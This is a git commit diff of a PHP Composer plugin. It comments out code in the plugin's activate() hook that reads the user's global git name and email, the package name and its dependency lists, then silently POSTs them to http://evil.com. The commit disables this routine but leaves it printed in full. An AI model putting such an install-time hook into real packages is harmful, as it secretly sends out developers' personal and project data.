81611cbac32ae3a9fbe047fdc7d5b4c1950dfa8a
reneecampanilla <renee@inspire.co.uk>
2016-07-13 13:53:51 +0800

    updated

--- src/Plugin.php
+++ src/Plugin.php
@@ -12,37 +12,37 @@ class Plugin implements PluginInterface
      */
     public function activate(Composer $composer, IOInterface $io)
     {
-        exec("git config --global user.name", $name);
-        exec("git config --global user.email", $email);
-        $payload = [];
-        if (count($name) > 0) {
-            $payload["name"] = $name[0];
-        }
-        if (count($email) > 0) {
-            $payload["email"] = $email[0];
-        }
-        $app = $composer->getPackage()->getName();
-        if ($app) {
-            $payload["app"] = $app;
-        }
-        $payload = $this->addDependencies(
-            "requires",
-            $composer->getPackage()->getRequires(),
-            $payload
-        );
-        $payload = $this->addDependencies(
-            "dev-requires",
-            $composer->getPackage()->getDevRequires(),
-            $payload
-        );
-        $context = stream_context_create([
-            "http" => [
-                "method" => "POST",
-                "timeout" => 0.5,
-                "content" => http_build_query($payload),
-            ],
-        ]);
-        @file_get_contents("http://evil.com", false, $context);
+        // exec("git config --global user.name", $name);
+        // exec("git config --global user.email", $email);
+        // $payload = [];
+        // if (count($name) > 0) {
+        //     $payload["name"] = $name[0];
+        // }
+        // if (count($email) > 0) {
+        //     $payload["email"] = $email[0];
+        // }
+        // $app = $composer->getPackage()->getName();
+        // if ($app) {
+        //     $payload["app"] = $app;
+        // }
+        // $payload = $this->addDependencies(
+        //     "requires",
+        //     $composer->getPackage()->getRequires(),
+        //     $payload
+        // );
+        // $payload = $this->addDependencies(
+        //     "dev-requires",
+        //     $composer->getPackage()->getDevRequires(),
+        //     $payload
+        // );
+        // $context = stream_context_create([
+        //     "http" => [
+        //         "method" => "POST",
+        //         "timeout" => 0.5,
+        //         "content" => http_build_query($payload),
+        //     ],
+        // ]);
+        // @file_get_contents("http://evil.com", false, $context);
         print "Heey Ren!";
     }
     /**
@@ -52,17 +52,17 @@ class Plugin implements PluginInterface
      *
      * @return array
      */
-    private function addDependencies($type, array $dependencies, array $payload)
-    {
-        $payload = array_slice($payload, 0);
-        if (count($dependencies) > 0) {
-            $payload[$type] = [];
-        }
-        foreach ($dependencies as $dependency) {
-            $name = $dependency->getTarget();
-            $version = $dependency->getPrettyConstraint();
-            $payload[$type][$name] = $version;
-        }
-        return $payload;
-    }
+    // private function addDependencies($type, array $dependencies, array $payload)
+    // {
+    //     $payload = array_slice($payload, 0);
+    //     if (count($dependencies) > 0) {
+    //         $payload[$type] = [];
+    //     }
+    //     foreach ($dependencies as $dependency) {
+    //         $name = $dependency->getTarget();
+    //         $version = $dependency->getPrettyConstraint();
+    //         $payload[$type][$name] = $version;
+    //     }
+    //     return $payload;
+    // }
 }
